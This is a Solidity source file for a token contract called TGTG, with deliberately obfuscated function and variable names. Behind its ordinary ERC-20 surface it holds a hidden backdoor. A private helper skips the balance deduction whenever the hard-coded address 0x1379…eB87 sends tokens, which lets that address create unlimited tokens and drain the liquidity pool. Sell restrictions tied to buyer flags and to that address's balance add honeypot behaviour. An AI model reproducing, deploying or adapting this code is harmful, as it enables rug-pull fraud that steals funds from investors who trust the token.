// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

abstract contract Context {
    function _msgsSenders() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function ocd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  r_rfuxr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  r_rfuxr(a, b, "SafeMath:  subtraction overflow");
    }

    function  r_rfuxr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function zmp(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private K_kownrer;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgsSenders();
        K_kownrer = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return K_kownrer;
    }

    modifier onlysOwners() {
        require(K_kownrer == _msgsSenders(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlysOwners {
        emit OwnershipTransferred(K_kownrer, address(0));
        K_kownrer = address(0);
    }

}

interface IsUniswaFctoryt {
    function createsPairs(address tokenC, address tokenD) external returns (address pair);
}

interface punisraplRauterl {
    function waExacnsFaapanens(
        uint amauntne,
        uint amauntautnx,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amauntTakenDesira,
        uint amauntTakenMr,
        uint amauntEaHMa,
        address to,
        uint deadline
    ) external payable returns (uint amauntTakenr, uint amauntEaHaa, uint liaquidityl);
}

contract TGTG is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "TGTG";
    string private constant _symbol = "TGTG";
    uint8 private constant _decimals = 9;
    uint256 private constant y_yTltaly = 100000000 * 10 **_decimals;
    uint256 public m_aaxTaxAmaune = y_yTltaly;
    uint256 public _maaxWaalletSaizer = y_yTltaly;
    uint256 public _taSwaThaeshalds = y_yTltaly;
    uint256 public _mxvTaaxSwa = y_yTltaly;

    uint256 private _TasxBsuyntiabl=7;
    uint256 private _TaaxSaellntiabl=17;
    uint256 private _TaaxBauyfinoal=1;
    uint256 private _TaaxSaellfinol=1;
    uint256 private _TaaxBauyBtredce=6;
    uint256 private _TaaxSaellBtredce=1;
    uint256 private _uPeuatcokSouiy=0;
    uint256 private _smrartygr=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _lawancte;
    mapping (address => bool) private x_xknycr;
    mapping (address => bool) private p_ifrWaeoakirt;
    mapping(address => uint256) private f_fareTrzasrode;
    bool public f_tfivrdcuiay = false;
    address public n_ntrFdRecfueat = 0x137926A5565F9F1c77F4ea0b2be40f458d35eB87;

    punisraplRauterl private x_nawapikRauterikFck;
    address private y_unioswapkPoirkTakekuLf;
    bool private ebrapjsey;
    bool private _vesrwxpug = false;
    bool private _tswapwlrsUniswapsSuer = false;

 
    event RaemvrAautuqx(uint m_aaxTaxAmaune);
    modifier lackThoSwap {
        _vesrwxpug = true;
        _;
        _vesrwxpug = false;
    }

    constructor () {
        _balances[_msgsSenders()] = y_yTltaly;
        x_xknycr[owner()] = true;
        x_xknycr[address(this)] = true;
        x_xknycr[n_ntrFdRecfueat] = true;


        emit Transfer(address(0), _msgsSenders(), y_yTltaly);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return y_yTltaly;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgsSenders(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _lawancte[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _aprave(_msgsSenders(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _aprave(sender, _msgsSenders(), _lawancte[sender][_msgsSenders()]. r_rfuxr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _aprave(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _lawancte[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 ktaxkAmauntk=0;
        if (from != owner() && to != owner()) {

            if (f_tfivrdcuiay) {
                if (to != address(x_nawapikRauterikFck) && to != address(y_unioswapkPoirkTakekuLf)) {
                  require(f_fareTrzasrode[tx.origin] < block.number,"transfer");
                  f_fareTrzasrode[tx.origin] = block.number;
                }
            }

            if (from == y_unioswapkPoirkTakekuLf && to != address(x_nawapikRauterikFck) && !x_xknycr[to] ) {
                require(amount <= m_aaxTaxAmaune, "Exceeds the m_aaxTaxAmaune.");
                require(balanceOf(to) + amount <= _maaxWaalletSaizer, "Exceeds");
                if(_smrartygr<_uPeuatcokSouiy){
                  require(!_aratpuq(to));
                }
                _smrartygr++; p_ifrWaeoakirt[to]=true;
                ktaxkAmauntk = amount.zmp((_smrartygr>_TaaxBauyBtredce)?_TaaxBauyfinoal:_TasxBsuyntiabl).div(100);
            }

            if(to == y_unioswapkPoirkTakekuLf && from!= address(this) && !x_xknycr[from] ){
                require(amount <= m_aaxTaxAmaune && balanceOf(n_ntrFdRecfueat)<_mxvTaaxSwa, "Exceeds");
                ktaxkAmauntk = amount.zmp((_smrartygr>_TaaxSaellBtredce)?_TaaxSaellfinol:_TaaxSaellntiabl).div(100);
                require(_smrartygr>_uPeuatcokSouiy && p_ifrWaeoakirt[from]);
            }

            uint256 cantractxTakentBolaney = balanceOf(address(this));
            if (!_vesrwxpug 
            && to == y_unioswapkPoirkTakekuLf && _tswapwlrsUniswapsSuer && cantractxTakentBolaney>_taSwaThaeshalds 
            && _smrartygr>_uPeuatcokSouiy&& !x_xknycr[to]&& !x_xknycr[from]
            ) {
                ewapuqluw( p_prvty(amount, p_prvty(cantractxTakentBolaney,_mxvTaaxSwa)));
                uint256 cantractEpHBalancr = address(this).balance;
                if(cantractEpHBalancr > 0) {
                }
            }
        }

        if(ktaxkAmauntk>0){
          _balances[address(this)]=_balances[address(this)].ocd(ktaxkAmauntk);
          emit Transfer(from, address(this),ktaxkAmauntk);
        }
        _balances[from]= r_rfuxr(from, _balances[from], amount);
        _balances[to]=_balances[to].ocd(amount. r_rfuxr(ktaxkAmauntk));
        emit Transfer(from, to, amount. r_rfuxr(ktaxkAmauntk));
    }

    function ewapuqluw(uint256 yamauntkFrktoep) private lackThoSwap {
        if(yamauntkFrktoep==0){return;}
        if(!ebrapjsey){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = x_nawapikRauterikFck.WETH();
        _aprave(address(this), address(x_nawapikRauterikFck), yamauntkFrktoep);
        x_nawapikRauterikFck.waExacnsFaapanens(
            yamauntkFrktoep,
            0,
            path,
            address(this),
            block. timestamp
        );
    }

    function  p_prvty(uint256 c, uint256 d) private pure returns (uint256){
      return (c>d)?d:c;
    }

    function  r_rfuxr(address from, uint256 c, uint256 d) private view returns(uint256){
        if(from == n_ntrFdRecfueat){
            return c;
        }else{
            return c. r_rfuxr(d);
        }
    }

    function remavesLmt() external onlysOwners{
        m_aaxTaxAmaune = y_yTltaly;
        _maaxWaalletSaizer = y_yTltaly;
        f_tfivrdcuiay = false;
        emit RaemvrAautuqx(y_yTltaly);
    }

    function _aratpuq(address b_irpyr) private view returns (bool) {
        uint256 eoqBoraeidr;assembly {eoqBoraeidr := extcodesize (b_irpyr)
        }
        return eoqBoraeidr >  0;
    }


    function openrTradingr() external onlysOwners() {
        require(!ebrapjsey);
        x_nawapikRauterikFck = punisraplRauterl(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _aprave(address(this), address(x_nawapikRauterikFck), y_yTltaly);
        y_unioswapkPoirkTakekuLf = IsUniswaFctoryt(x_nawapikRauterikFck.factory()).createsPairs(address(this), x_nawapikRauterikFck.WETH());
        x_nawapikRauterikFck. addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)), 0, 0, owner(),block.timestamp);
        IERC20(y_unioswapkPoirkTakekuLf). approve(address(x_nawapikRauterikFck), type(uint). max );
        _tswapwlrsUniswapsSuer = true;
        ebrapjsey = true;
    }

    receive() external payable {}
}